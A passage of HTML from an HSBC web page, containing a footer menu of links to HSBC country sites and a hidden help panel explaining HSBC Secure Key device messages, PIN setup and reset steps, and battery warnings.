                            <a href="http://www.hsbc.ie/1/2/hsbc-ireland/home/home" title="Ireland" class="ie" lang="en-IE">Ireland</a></li>
                        <li class="multiTop">
                            <a href="http://www.hsbc.kz/1/2/en/home" title="Kazakhstan" class="kz" lang="en-GB">Kazakhstan</a></li>
                        <li class="multiMiddle">
                            <a href="http://www.hsbc.kz/1/2/kk/home" title="Қазақстан" lang="kk-KZ">Қазақстан</a></li>
                        <li class="multiBottom">
                            <a href="http://www.hsbc.kz/1/2/ru/home" title="Казахстан" lang="ru-RU">Казахстан</a></li>
                        <li>
                            <a href="https://www.hsbc.com.mt/1/2/home/hsbc-bank-malta-plc-home-page" title="Malta" class="mt" lang="en-GB">Malta</a></li>
                        <li class="multiTop">
                            <a href="http://www.hsbc.pl/1/2/en/home" title="Poland" class="pl" lang="en-GB">Poland</a></li>
                        <li class="last multiBottom">
                            <a href="http://www.hsbc.pl/1/2/pl/home" title="Polska" lang="pl-PL">Polska</a></li>
                    </ul>

                    <ul class="nav">
                        <li class="multiTop">
                            <a href="http://www.hsbc.ru/1/2/rus/en/home" title="Russia" class="ru" lang="en-GB">Russia</a></li>
                        <li class="multiBottom">
                            <a href="http://www.hsbc.ru/1/2/rus/ru/home" title="Россия" lang="ru-RU">Россия</a></li>
                        <li class="multiTop">
                            <a href="http://www.hsbc.sk/1/2/hsbc-slovakia/en/home" title="Slovakia" class="sk" lang="en-GB">Slovakia</a></li>
                        <li class="multiBottom">
                            <a href="http://www.hsbc.sk/1/2/hsbc-slovakia/sk/home/home" title="Slovensko" lang="sk-SK">Slovensko</a></li>
                        <li class="multiTop">
                            <a href="http://www.hsbc.es/1/2/esp/en/home" title="Spain" class="es" lang="es-ES">Spain</a></li>
                        <li class="multiBottom">
                            <a href="http://www.hsbc.es/1/2/esp/es/home" title="España" lang="en-GB">España</a></li>
                        <li>
                            <a href="http://www.hsbc.ch/1/2/che/en/corporate" title="Switzerland" class="ch" lang="en-GB">Switzerland</a></li>
                        <li class="multiTop">
                            <a href="http://www.hsbc.com.tr/eng/" title="Turkey" class="tr" lang="en-GB">Turkey</a></li>
                        <li class="multiBottom">
                            <a href="http://www.hsbc.com.tr/tr/" title="Türkiye" lang="tr-TR">Türkiye</a></li>
                        <li class="last">
                            <a href="http://www.hsbc.co.uk/1/2/personal" title="United Kingdom" class="uk" lang="en-GB">United
                            Kingdom</a></li>
                    </ul>
                </div>
            </div>
            <div aria-hidden="true" class="region" id="asiaPacificMenu" style=" display: none;" role="tabpanel" aria-labelledby="asiaPacificTab">
                <h2 style=" display: none;">
                Asia-Pacific</h2>
                <div class="navList">
                    <ul class="nav">
                        <li>
                            <a href="http://www.hsbc.com.au/1/2/home" title="Australia" class="au" lang="en-AU">Australia</a></li>
                        <li>
                            <a href="http://www.hsbc.com.bd/1/2/home" title="Bangladesh" class="bd" lang="en-GB">Bangladesh</a></li>
                        <li>
                            <a href="http://www.hsbc.com.bn/1/2/home" title="Brunei Darussalam" class="bn" lang="en-GB">Brunei
                            Darussalam</a></li>
                        <li class="multiTop">
                            <a href="http://www.hsbc.com.cn/1/2/home" title="China" class="cn" lang="en-GB">China</a></li>
                        <li class="multiBottom">
                            <a href="http://www.hsbc.com.cn/1/2/" title="中国" lang="zh-CN">中国</a></li>
                        <li class="multiTop">
                            <a href="http://www.hsbc.com.hk/1/2/home" title="Hong Kong" class="hk" lang="en-GB">Hong Kong</a></li>
                        <li class="multiMiddle">
                            <a href="http://www.hsbc.com.hk/1/2/chinese/home" title="香港（繁體中文）" lang="zh-HK">香港<span>（繁體中文）</span></a></li>
                        <li class="multiBottom">
                            <a href="http://www.hsbc.com.hk/1/2/simplified/home" title="香港（简体中文）" lang="zh-CN">香港<span>（简体中文）</span></a></li>
                        <li class="multiTop">
                            <a href="http://www.hsbc.co.id/1/2/home_en_US" title="Indonesia (English)" class="id" lang="en-GB">Indonesia
                            <span>(English)</span></a></li>
                        <li class="last multiBottom">
                            <a href="http://www.hsbc.co.id/1/2/home_in_ID" title="Indonesia (Bahasa Indonesia)" lang="id-ID">Indonesia
                            <span>(Bahasa
                                Indonesia)</span></a></li>
                    </ul>
                    <ul class="nav">
                        <li>
                            <a href="http://www.hsbc.co.in/1/2/homepage" title="India" class="in" lang="en-GB">India</a></li>
                        <li class="multiTop">
                            <a href="http://www.hsbc.co.jp/1/2/home" title="Japan" class="jp" lang="en-GB">Japan</a></li>
                        <li class="multiBottom">
                            <a href="http://www.hsbc.co.jp/1/2/home-jp" title="日本" lang="ja-JP">日本</a></li>
                        <li class="multiTop">
                            <a href="http://www.hsbc.co.kr/1/2/home" title="Korea" class="kr" lang="en-GB">Korea</a></li>
                        <li class="multiBottom">
                            <a href="http://www.hsbc.co.kr/1/2/home_ko" title="한국" lang="ko-KR">한국</a></li>
                        <li class="multiTop">
                            <a href="http://www.hsbc.com.mo/1/2/home-en" title="Macau" class="mo" lang="en-GB">Macau</a></li>
                        <li class="multiBottom">
                            <a href="http://www.hsbc.com.mo/1/2/home-mo" title="澳門" lang="zh-MO">澳門</a></li>
                        <li>
                            <a href="http://www.hsbc.com.my/1/2/HSBC-Bank-Malaysia-Berhad" title="Malaysia" class="my" lang="en-GB">Malaysia</a></li>
                        <li>
                            <a href="http://www.hsbc.lk/1/2/home-page/male-branch" title="Maldives" class="mv" lang="en-GB">Maldives</a></li>
                        <li class="last">
                            <a href="http://www.hsbc.co.nz/1/2/home" title="New Zealand" class="nz" lang="en-NZ">New
                            Zealand</a></li>
                    </ul>
                    <ul class="nav">
                        <li>
                            <a href="http://www.hsbc.com.pk/1/2/home" title="Pakistan" class="pk" lang="en-GB">Pakistan</a></li>
                        <li>
                            <a href="http://www.hsbc.com.ph/1/2/home" title="Philippines" class="ph" lang="en-PH">Philippines</a></li>
                        <li>
                            <a href="http://www.hsbc.com.sg/1/2/home" title="Singapore" class="sg" lang="en-GB">Singapore</a></li>
                        <li>
                            <a href="http://www.hsbc.lk/1/2/home-page" title="Sri Lanka" class="lk" lang="en-GB">Sri Lanka</a></li>
                        <li class="multiTop">
                            <a href="http://www.hsbc.com.tw/1/2/home_en" title="Taiwan" class="tw" lang="en-GB">Taiwan</a></li>
                        <li class="multiBottom">
                            <a href="http://www.hsbc.com.tw/1/2/home_zh_TW" title="台灣" lang="zh-TW">台灣</a></li>
                        <li class="multiTop">
                            <a href="http://www.hsbc.co.th/1/2/home-en" title="Thailand" class="th" lang="en-GB">Thailand</a></li>
                        <li class="multiBottom">
                            <a href="http://www.hsbc.co.th/1/2/home-th" title="ประเทศไทย" lang="th-TH">ประเทศไทย</a></li>
                        <li class="multiTop">
                            <a href="http://www.hsbc.com.vn/1/2/home_en" title="Vietnam" class="vn" lang="en-GB">Vietnam</a></li>
                        <li class="last multiBottom">
                            <a href="http://www.hsbc.com.vn/1/2/home" title="Việt Nam" lang="vi-VN">Việt Nam</a></li>
                    </ul>
                </div>
            </div>
            <div aria-hidden="true" class="region" id="middleEastMenu" style=" display: none;" role="tabpanel" aria-labelledby="middleEastTab">
                <h2 style=" display: none;">
                Middle East &amp; Africa</h2>
                <div class="navList">
                    <ul class="nav">
                        <li>
                            <a href="http://www.algeria.hsbc.com/hsbcdz" title="Algeria" class="dz" lang="fr-FR">Algeria</a></li>
                        <li class="multiTop">
                            <a href="http://www.hsbc.com.bh/1/2/home" title="Bahrain (Conventional Banking)" class="bh" lang="en-GB">Bahrain
                            <span>(Conventional)</span></a></li>
                        <li class="multiBottom">
                            <a href="http://www.hsbc.com.bh/1/2/islamic-financial-solutions" title="Bahrain (Islamic Amanah Banking)" lang="en-GB">Bahrain
                            <span>(Islamic Amanah)</span></a></li>
                        <li>
                            <a href="http://www.hsbc.com.eg/1/2/" title="Egypt" class="eg" lang="en-GB">Egypt</a></li>
                        <li>
                            <a href="http://www.hsbc.jo/1/2/home" title="Jordan" class="jo" lang="en-GB">Jordan</a></li>
                        <li>
                            <a href="http://www.kuwait.hsbc.com/1/2/kuwait" title="Kuwait" class="kw" lang="en-GB">Kuwait</a></li>
                        <li>
                            <a href="http://www.hsbc.com.lb/1/2/home" title="Lebanon" class="lb" lang="en-GB">Lebanon</a></li>
                        <li class="last">
                            <a href="http://www.hsbc.co.mu/1/2/home" title="Mauritius" class="mu" lang="en-GB">Mauritius</a></li>
                    </ul>
                    <ul class="nav">
                        <li>
                            <a href="http://www.hsbc.co.om/1/2/home" title="Oman" class="om" lang="en-GB">Oman</a></li>
                        <li class="multiTop">
                            <a href="http://www.hsbc.com.qa/1/2/ALL_SITE_PAGES/home" title="Qatar (Conventional Banking)" class="qa" lang="en-GB">Qatar
                            <span>(Conventional)</span></a></li>
                        <li class="multiBottom">
                            <a href="http://www.hsbc.com.qa/1/2/ALL_SITE_PAGES/hsbc-amanah" title="Qatar (Islamic Amanah Banking)" lang="en-GB">Qatar
                            <span>(Islamic Amanah)</span></a></li>
                        <li>
                            <a href="http://www.sabb.com/1/2/sabb-en/home" title="Saudi Arabia" class="sa" lang="en-GB">Saudi
                            Arabia</a></li>
                        <li>
                            <a href="http://www.sabb.com/1/2/sabb-ar/home" title="السعودية" lang="ar-SA">السعودية</a></li>
                        <li>
                            <a href="http://www.hsbc.co.za/" title="South Africa" class="za" lang="en-ZA">South Africa</a></li>
                        <li class="multiTop">
                            <a href="http://www.hsbc.ae/1/2/personal" title="United Arab Emirates (Conventional Banking)" class="ae" lang="en-GB">United
                            Arab Emirates <span>(Conventional)</span></a></li>
                        <li class="last multiBottom">
                            <a href="http://www.hsbc.ae/1/2/amanah-personal" title="United Arab Emirates (Islamic Amanah Banking)" lang="en-GB">United
                            Arab Emirates <span>(Islamic Amanah)</span></a></li>
                    </ul>
                </div>
            </div>
            <div aria-hidden="true" class="region" id="americasMenu" style=" display: none;" role="tabpanel" aria-labelledby="americasTab">
                <h2 style=" display: none;">
                Americas</h2>
                <div class="navList">
                    <ul class="nav">
                        <li>
                            <a href="http://www.hsbc.com.ar/ar/hsbcgrupo/" title="Argentina" class="ar" lang="es-AR">Argentina</a></li>
                        <li>
                            <a href="http://www.hsbc.bm/1/2/bermuda/home" title="Bermuda" class="bm" lang="en-US">Bermuda</a></li>
                        <li class="multiTop">
                            <a href="http://www.hsbc.com.br/1/2/portal/en/personal/international-services" title="Brazil (English)" class="br" lang="en-US">Brazil <span>(English)</span></a></li>
                        <li class="multiBottom">
                            <a href="http://www.hsbc.com.br/1/2/portal/pt/pagina-inicial" title="Brasil (Português)" lang="pt-BR">Brasil
                            <span>(Português)</span></a></li>
                        <li class="multiTop">
                            <a href="http://www.hsbc.ca/1/2/en/home/home" title="Canada (English)" class="ca" lang="en-CA">Canada
                            <span>(English)</span></a></li>
                        <li class="multiMiddle">
                            <a href="http://www.hsbc.ca/1/2/fr/home/home" title="Canada (Français)" lang="fr-CA">Canada
                            <span>(Français)</span></a></li>
                        <li class="multiMiddle">
                            <a href="http://www.hsbc.ca/1/2/tw/home/home" title="加拿大（繁體中文）" lang="zh-HK">加拿大<span>（繁體中文）</span></a></li>
                        <li class="multiBottom">
                            <a href="http://www.hsbc.ca/1/2/cn/home/home" title="加拿大（简体中文）" lang="zh-CN">加拿大<span>（简体中文）</span></a></li>
                        <li class="last">
                            <a href="http://www.hsbc.ky/1/2/cayman/home" title="Cayman Islands" class="ky" lang="en-US">Cayman
                            Islands</a></li>
                    </ul>
                    <ul class="nav">
                        <li class="multiTop">
                            <a href="http://www.hsbc.cl/1/2/en/home" title="Chile (English)" class="cl" lang="en-US">Chile
                            <span>(English)</span></a></li>
                        <li class="multiBottom">
                            <a href="http://www.hsbc.cl/1/2/es/home" title="Chile (Español)" lang="es-CL">Chile <span>(Español)</span></a></li>
                        <li class="multiTop">
                            <a href="http://www.hsbc.com.co/1/2/en/home" title="Colombia (English)" class="co" lang="en-US">Colombia
                            <span>(English)</span></a></li>
                        <li class="multiBottom">
                            <a href="http://www.hsbc.com.co/1/2/es/home" title="Colombia (Español)" lang="es-CO">Colombia
                            <span>(Español)</span></a></li>
                        <li>
                            <a href="http://www.hsbc.fi.cr/" title="Costa Rica" class="cr" lang="es-CR">Costa Rica</a></li>
                        <li>
                            <a href="http://www.hsbc.com.sv/" title="El Salvador" class="sv" lang="es-SV">El Salvador</a></li>
                        <li>
                            <a href="http://www.hsbc.com.hn/es/index.asp" title="Honduras" class="hn" lang="es-HN">Honduras</a></li>
                        <li class="multiTop">
                            <a href="http://www.hsbc.com.mx/1/2/en/home" title="Mexico (English)" class="mx" lang="en-US">Mexico
                            <span>(English)</span></a></li>
                        <li class="last multiBottom">
                            <a href="http://www.hsbc.com.mx/1/2/es/home" title="México (Español)" lang="es-MX">México <span>(Español)</span></a></li>
                    </ul>
                    <ul class="nav">
                        <li class="multiTop">
                            <a href="http://www.hsbc.com.pa/1/2/en/home" title="Panama (English)" class="pa" lang="en-US">Panama
                            <span>(English)</span></a></li>
                        <li class="multiBottom">
                            <a href="http://www.hsbc.com.pa/1/2/es/home" title="Panamá (Español)" lang="es-PA">Panamá <span>(Español)</span></a></li>
                        <li class="multiTop">
                            <a href="http://www.hsbc.com.py/" title="Paraguay (English)" class="py" lang="en-US">Paraguay
                            <span>(English)</span></a></li>
                        <li class="multiBottom">
                            <a href="http://www.hsbc.com.py/" title="Paraguay (Español)" lang="es-PY">Paraguay <span>(Español)</span></a></li>
                        <li>
                            <a href="http://www.hsbc.com.pe/1/2/es/home" title="Perú" class="pe" lang="es-PE">Perú</a></li>
                        <li>
                            <a href="http://www.us.hsbc.com/" title="United States" class="us" lang="en-US">United States</a></li>
                        <li class="last">
                            <a href="http://www.hsbc.com.uy/" title="Uruguay" class="uy" lang="es-UY">Uruguay</a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>

    
    <!-- Footer Section Ends -->

    <div id="lightboxContent1" style="display:none;">

        <div class="alertLightboxInner">
            <div class="row">
                <div class="innerPage secure">
                    <div data-lightbox-type="hsbcwidget/ToggleButtons" class="securityDetails">
                        <div class="row headerStyle01 headerStyle01-ext">
                            <h3 class="left welcome">If something isn't right, your HSBC 
Secure Key will tell you. Click on the tabs below to read the key 
messages and discover what you need to do.</h3>
                        </div>
                        <div class="clearfix toggleButtons">
                            <ul class="listStyle02 navi naviTabs eightItemList clearfix" data-dojo-attach-event="click:_onTabSelect">
                                <li class="first active" data-dojo-attach-point="currentTab">
                                    <a tabindex="0" href="#tab1">
                                        <span class="listStyle02inner">Overview<span data-dojo-attach-point="pointerArrow" class="dijitOffScreen"> (Selected) </span></span>
                                    </a>
                                </li>
                                <li>
                                    <a tabindex="0" href="#tab2">
                                        <span class="listStyle02inner">Fail PIN</span>
                                    </a>
                                </li>
                                <li>
                                    <a tabindex="0" href="#tab3">
                                        <span class="listStyle02inner">PIN not safe</span>
                                    </a>
                                </li>
                                <li>
                                    <a tabindex="0" href="#tab4">
                                        <span class="listStyle02inner">Fail 1, 2 or 3</span>
                                    </a>
                                </li>
                                <li>
                                    <a tabindex="0" href="#tab5">
                                        <span class="listStyle02inner">Lock PIN</span>
                                    </a>
                                </li>
                                <li>
                                    <a tabindex="0" href="#tab6">
                                        <span class="listStyle02inner">Reset PIN</span>
                                    </a>
                                </li>
                                <li>
                                    <a tabindex="0" href="#tab7">
                                        <span class="listStyle02inner">Button</span>

                                    </a>
                                </li>
                                <li>
                                    <a tabindex="0" href="#tab8">
                                        <span class="listStyle02inner">Battery</span>
                                    </a>
                                </li>
                            </ul>
                            <div id="tab1" class="tab-content active" data-dojo-attach-point="currentTabContent">
                                <div class="inner clearfix">
                                    <div class="apply1_Overview">
                                        <img alt="" src="files/img/secure_key_support_dash_140x217.jfif" role="presentation" draggable="false" aria-hidden="true">
                                    </div>
                                    <div class="apply33 apply2_Overview">
                                        <h4 class="yellowBtn yellowBtn_skho_mt">Yellow Button</h4>
                                        <ul class="listBullets01">
                                            <li class="listBullets01_noBullet_mt">This button is used after creating a new PIN</li>
                                            <li class="listBullets01_noBullet_mt">The yellow button is also used to generate a transaction code for authorising new payments</li>
                                        </ul>
                                    </div>
                                    <div class="apply3_Overview">
                                        <h4 class="greenBtn greenBtn_skho_mt">Green Button</h4>
                                        <ul class="listBullets01">
                                            <li class="listBullets01_noBullet_mt">Press and hold for 2 seconds to turn on the device</li>
                                            <li class="listBullets01_noBullet_mt">Press once to delete one character</li>
                                            <li class="listBullets01_noBullet_mt">Press and hold to clear all input</li>
                                            <li class="listBullets01_noBullet_mt">After you've entered your PIN, press here to generate a log on security code</li>
                                        </ul>
                                    </div>
                                    <div class="apply4_Overview">
                                        <h4 class="button3 button3_font">Button 3</h4>
                                        <ul class="listBullets01">
                                            <li class="listBullets01_noBullet_mt">Press once to generate a reauthentication security code to perform transactions.</li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                            <div id="tab2" class="tab-content hide">
                                <div class="inner clearfix">
                                    <div class="apply1">
                                        <img alt="" src="files/img/secure_key_support_failpin_140x217.jfif" role="presentation" draggable="false" aria-hidden="true">
                                    </div>
                                    <div class="apply2">
                                        <h4 class="h4_skho_mt">Step 1</h4>
                                        <p>You will see this message when setting up the PIN for the first time if the two entries do not match</p>
                                    </div>
                                    <div class="apply3">
                                        <h4 class="h4_skho_mt">Step 2</h4>
                                        <p>Press the yellow button to return to the PIN setup and repeat the steps to set up a PIN</p>
                                    </div>
                                </div>
                            </div>
                            <div id="tab3" class="tab-content hide">
                                <div class="inner clearfix">
                                    <div class="apply1">
                                        <img alt="" src="files/img/secure_key_support_notsafe_140x217.jfif" role="presentation" draggable="false" aria-hidden="true">
                                    </div>
                                    <div class="apply2">
                                        <p>The new PIN you have entered is not safe and could be guessed. Please enter another PIN.</p>
                                        <p>Your PIN can be made up of any numbers as long as they don't follow a logical or sequential pattern, for example 123456 or 11111.</p>
                                    </div>
                                    <div class="apply3">

                                    </div>
                                </div>
                            </div>
                            <div id="tab4" class="tab-content hide">
                                <div class="inner clearfix">
                                    <div class="apply1">
                                        <img alt="" src="files/img/secure_key_support_fail888_140x217.jfif" role="presentation" draggable="false" aria-hidden="true">
                                    </div>
                                    <div class="apply2">
                                        <p>If you enter an incorrect PIN, you will see the message 'FAIL 1'. Press the green button to enter your PIN again.</p>
                                        <p>You will have three attempts to enter your PIN correctly.</p>
                                        <p>Your HSBC Secure Key Key will remember the number of failed attempts you have made.</p>
                                    </div>
                                    <div class="apply3">
                                        <p>After the third incorrect attempt ('FAIL 3'), the HSBC Secure Key will become locked.</p>
                                        <p>Please select the Lock PIN tab to find out more.</p>
                                    </div>
                                </div>
                            </div>
                            <div id="tab5" class="tab-content hide">
                                <div class="inner clearfix">
                                    <div class="apply1">
                                        <img alt="" src="files/img/secure_key_support_lock_140x217.jfif" role="presentation" draggable="false" aria-hidden="true">
                                    </div>
                                    <div class="apply2">
                                        <p>If your HSBC Secure Key is locked, it will display a seven digit code on screen whenever it is turned on.</p>
                                        <p>To continue using Internet Banking, you will need to reset your PIN online.</p>
                                        <p>To do this, start logging on to Personal Internet Banking and enter your user ID.</p>
                                    </div>
                                    <div class="apply3">
                                        <p>At the next screen, click the 'Forgotten your HSBC Secure Key PIN'. Follow the on screen instructions and you will be given a PIN Reset Code.</p>
                                        <!--<h4><img alt="" src="/1/PA_esf-ca-app-content/content/pws/content/personal/internet-banking-support/images/green_button_22x23.gif" />Green Button</h4>-->
                                        <p>Once you have the code, press the green button lightly and quickly - but do not hold it down. You will then be prompted to input the code.</p>
                                    </div>
                                </div>
                            </div>
                            <div id="tab6" class="tab-content hide">
                                <div class="inner three">
                                    <div class="apply1">
                                        <img alt="" src="files/img/secure_key_support_fail_140x217.jfif" role="presentation" draggable="false" aria-hidden="true">
                                    </div>
                                    <div class="apply2">
                                        <p>If you enter an incorrect 'PIN reset code', a 'FAIL 1' message will be displayed.</p>
                                        <p>You will then be prompted to input your PIN for the second time. For your protection the HSBC Secure Key will lock after three incorrect PIN entries.</p>
                                        <p>Once your HSBC Secure Key is locked, it will display a 7 digit unlock code. Please select the "Forgot your Secure Key PIN?" link on the Personal Internet Banking logon page, and after verifying Security Questions 1 and 2, enter the unlock code into the on screen box and click "Continue". Your web browser will then display a PIN reset code. Enter the PIN reset code into your HSBC Secure Key to unlock your device.
                                        </p>
                                    </div>
                                    <div class="apply3">

                                    </div>
                                </div>
                            </div>
                            <div id="tab7" class="tab-content hide">
                                <div class="inner three">
                                    <div class="apply1">
                                        <img alt="" src="files/img/secure_key_support_button_140x217.jfif" role="presentation" draggable="false" aria-hidden="true">
                                    </div>
                                    <div class="apply2">
                                        <p>This messages indicates that a button is being pressed and held for too long</p>
                                        <p>If you press and hold a button for more than 7 seconds, the device will switch off to preserve battery life.</p>
                                    </div>
                                    <div class="apply3">

                                    </div>
                                </div>
                            </div>
                            <div id="tab8" class="tab-content hide">
                                <div class="inner three">
                                    <div class="apply1">
                                        <img alt="" src="files/img/secure_key_support_batt_140x217.jfif" role="presentation" draggable="false" aria-hidden="true">
                                    </div>
                                    <div class="apply2">
                                        <p>This is the low battery message.</p>
                                        <p>After its first appearance, the BATT message is displayed for two seconds each time the device is switched on. After two seconds the device works as normal.</p>
                                        <p>BATT 2: 2 months remaining
                                            <br>BATT 1: 1 month remaining
                                            <br>BATT 0: replacement needed</p>
                                    </div>
                                    <div class="apply3">
                                        <p>Please contact HSBC Customer Service to order a replacement Secure Key at
                                            <br> Customer Services on 03456 002290.</p>
                                    </div>
                                </div>
                            </div>

                        </div>
                        <div class="inner info info_skho_mt">
                            <p>The HSBC Secure Key does not have an off button. After 30 seconds of inactivity, the device will automatically switch off</p>
                        </div>
                        <div class="inner">
                            <p class="fontStyle01">Can't see your message in the tabs above?</p>
                            <p>Scroll down the complete list of HSBC Secure Key messages below</p>
                        </div>
                        <div class="grid12 grid12_skho_mt">
                            <div class="troubleshootingShowHide">
                                <div class="sliderWrap" data-lightbox-type="hsbcwidget/ShowHide1" data-dojo-props="">
                                    <div class="showHideTrigger double-arrow-down">
                                        <img alt="" src="files/img/device_funcv5_page_02_116x55.gif" role="presentation" draggable="false" aria-hidden="true">
                                        <h3><a tabindex="0" href="#">NEW PIN <span class="hidden showHideState" aria-hidden="true"></span></a></h3>
                                    </div>
                                    <div class="showHideContent" aria-hidden="true" style="height: auto; display: none;">
                                        <p>You will need to create a new HSBC Secure Key PIN. Think of a PIN between 4 and 8 digits long. You should avoid using sequential or repeated numbers such as 1234 or 1111. Enter this into your HSBC Secure Key and press the yellow button.</p>
                                        <p>Note: If you make a mistake entering your PIN, you can use the green button to delete the last digit you have input.</p>
                                    </div>
                                </div>
                                <div class="sliderWrap" data-lightbox-type="hsbcwidget/ShowHide1" data-dojo-props="">
                                    <div class="showHideTrigger double-arrow-down">
                                        <img alt="" src="files/img/device_funcv5_page_03_115x55.gif" role="presentation" draggable="false" aria-hidden="true">
                                        <h3><a tabindex="0" href="#">PIN CONF<span class="hidden showHideState" aria-hidden="true"></span></a></h3>
                                    </div>
                                    <div class="showHideContent" aria-hidden="true" style="height: auto; display: none;">
                                        <p>The PIN you are setting up needs to be confirmed. Please re-enter your chosen PIN.</p>
                                    </div>
                                </div>
                                <div class="sliderWrap" data-lightbox-type="hsbcwidget/ShowHide1" data-dojo-props="">
                                    <div class="showHideTrigger double-arrow-down">
                                        <img alt="" src="files/img/device_funcv5_page_04_116x55.gif" role="presentation" draggable="false" aria-hidden="true">
                                        <h3><a tabindex="0" href="#">NEW PIN CONF HSBC<span class="hidden showHideState" aria-hidden="true"></span></a></h3>
                                    </div>
                                    <div class="showHideContent" aria-hidden="true" style="height: auto; display: none;">
                                        <p>You have successfully set-up your PIN. You can use your HSBC Secure Key.</p>
                                    </div>
                                </div>
                                <div class="sliderWrap" data-lightbox-type="hsbcwidget/ShowHide1" data-dojo-props="">
                                    <div class="showHideTrigger double-arrow-down">
                                        <img alt="" src="files/img/device_funcv5_page_05_115x55.gif" role="presentation" draggable="false" aria-hidden="true">
                                        <h3><a tabindex="0" href="#">FAIL PIN<span class="hidden showHideState" aria-hidden="true"></span></a></h3>
                                    </div>
                                    <div class="showHideContent" aria-hidden="true" style="height: auto; display: none;">
                                        <p>Your confirmation PIN did not match the first PIN entered.</p>
                                        <p>Press the <img src="files/img/yellow_button_22x23.gif" alt=""> yellow button to return to the PIN setup and repeat the steps to set up a PIN.</p>
                                    </div>
                                </div>
                                <div class="sliderWrap" data-lightbox-type="hsbcwidget/ShowHide1" data-dojo-props="">
                                    <div class="showHideTrigger double-arrow-down">
                                        <img alt="" src="files/img/device_funcv5_page_06_116x55.gif" role="presentation" draggable="false" aria-hidden="true">
                                        <h3><a tabindex="0" href="#">NEW PIN not SAFE <span class="hidden showHideState" aria-hidden="true"></span></a></h3>
                                    </div>
                                    <div class="showHideContent" aria-hidden="true" style="height: auto; display: none;">
                                        <p>The new PIN you have entered is not safe and could be guessed. Please enter another PIN. </p>
                                        <p>Your PIN can be made up of any numbers as long as they don't follow a logical or sequential pattern, for example 123456 or 11111.</p>
                                    </div>
                                </div>
                                <div class="sliderWrap" data-lightbox-type="hsbcwidget/ShowHide1" data-dojo-props="">
                                    <div class="showHideTrigger double-arrow-down">
                                        <img alt="" src="files/img/device_funcv5_page_08_115x55.gif" role="presentation" draggable="false" aria-hidden="true">
                                        <h3><a tabindex="0" href="#">PIN <span class="hidden showHideState" aria-hidden="true"></span></a></h3>
                                    </div>
                                    <div class="showHideContent" aria-hidden="true" style="height: auto; display: none;">
                                        <p>HSBC Secure Key is waiting for you to enter your PIN. The number of dashes shown on the screen, is equal to the number of digits in your PIN.</p>
                                    </div>
                                </div>
                                <div class="sliderWrap" data-lightbox-type="hsbcwidget/ShowHide1" data-dojo-props="">
                                    <div class="showHideTrigger double-arrow-down">
                                        <img alt="" src="files/img/device_funcv5_page_09_114x55.gif" role="presentation" draggable="false" aria-hidden="true">
                                        <h3><a tabindex="0" href="#">HSBC <span class="hidden showHideState" aria-hidden="true"></span></a></h3>
                                    </div>
                                    <div class="showHideContent" aria-hidden="true" style="height: auto; display: none;">
                                        <p>This is the welcome screen. You will see this once your PIN has been accepted. Press the green button to generate your security code.
                                        </p>
                                    </div>
                                </div>
                                <div class="sliderWrap" data-lightbox-type="hsbcwidget/ShowHide1" data-dojo-props="">
                                    <div class="showHideTrigger double-arrow-down">
                                        <img alt="" src="files/img/device_funcv5_page_56_113x55.gif" role="presentation" draggable="false" aria-hidden="true">
                                        <h3><a tabindex="0" href="#">PIN FAIL 1<span class="hidden showHideState" aria-hidden="true"></span></a></h3>
                                    </div>
                                    <div class="showHideContent" aria-hidden="true" style="height: auto; display: none;">
                                        <p>The PIN entered is incorrect. Press the green button lightly and quickly - do not hold it down. This will return you to the PIN entry screen.</p>
                                        <p>You will then be prompted to input your PIN again for the second time. To protect you from fraud, the HSBC Secure Key will lock after three incorrect PIN entries.</p>
                                    </div>
                                </div>
                                <div class="sliderWrap" data-lightbox-type="hsbcwidget/ShowHide1" data-dojo-props="">
                                    <div class="showHideTrigger double-arrow-down">
                                        <img alt="" src="files/img/pin_fail_2_113x55.gif" role="presentation" draggable="false" aria-hidden="true">
                                        <h3><a tabindex="0" href="#">PIN FAIL 2<span class="hidden showHideState" aria-hidden="true"></span></a></h3>
                                    </div>
                                    <div class="showHideContent" aria-hidden="true" style="height: auto; display: none;">
                                        <p>The PIN entered is incorrect. Press the green button lightly and quickly - do not hold it down. This will return you to the PIN entry screen.</p>
                                        <p>You will then be prompted to input your PIN for the third time. To protect you from fraud, the HSBC Secure Key will lock after three incorrect PIN entries.</p>
                                    </div>
                                </div>
                                <div class="sliderWrap" data-lightbox-type="hsbcwidget/ShowHide1" data-dojo-props="">
                                    <div class="showHideTrigger double-arrow-down">
                                        <img alt="" src="files/img/pin_fail_3_113x55.gif" role="presentation" draggable="false" aria-hidden="true">
                                        <h3><a tabindex="0" href="#">PIN FAIL 3 <span class="hidden showHideState" aria-hidden="true"></span></a></h3>
                                    </div>
                                    <div class="showHideContent" aria-hidden="true" style="height: auto; display: none;">
                                        <p>The PIN entered is incorrect. Your HSBC Secure Key is locked and will need to be reset. </p>

                                        <p>Press the green button lightly and quickly - do not hold it down. You will see LOCK PIN screen.</p>
                                    </div>
                                </div>
                                <div class="sliderWrap" data-lightbox-type="hsbcwidget/ShowHide1" data-dojo-props="">
                                    <div class="showHideTrigger double-arrow-down">
                                        <img alt="" src="files/img/lock_pin_4635135_113x55.gif" role="presentation" draggable="false" aria-hidden="true">
                                        <h3><a tabindex="0" href="#">LOCK PIN 4635135 <span class="hidden showHideState" aria-hidden="true"></span></a></h3>
                                    </div>
                                    <div class="showHideContent" aria-hidden="true" style="height: auto; display: none;">
                                        <p>If your HSBC Secure Key is locked. it will display a seven digit code on screen whenever it is turned on. </p>
                                        <p>To continue using Internet Banking, you will need to reset your PIN online.</p>
                                        <p>To do this, start logging on to Personal Internet Banking and enter your user ID. </p>
                                        <p>At the next screenclick the 'Forgotten your HSBC Secure Key PIN', follow the on screen instructions and you will be given a PIN Reset Code.</p>
                                        <p>Once you have the code, press the green button lightly and quickly - but do not hold it down. You will then be prompted to input the code.</p>
                                    </div>
                                </div>
                                <div class="sliderWrap" data-lightbox-type="hsbcwidget/ShowHide1" data-dojo-props="">
                                    <div class="showHideTrigger double-arrow-down">
                                        <img alt="" src="files/img/device_funcv5_page_18_115x55.gif" role="presentation" draggable="false" aria-hidden="true">
                                        <h3><a tabindex="0" href="#">LOCK PIN <span class="hidden showHideState" aria-hidden="true"></span></a></h3>
                                    </div>
                                    <div class="showHideContent" aria-hidden="true" style="height: auto; display: none;">
                                        <p>Your HSBC Secure Key is waiting for you to enter your seven digit PIN reset code.</p>
                                        <p>Once you have entered the code, you will be prompted to set up a new PIN.</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="grid12">
                            <div class="troubleshootingShowHide">
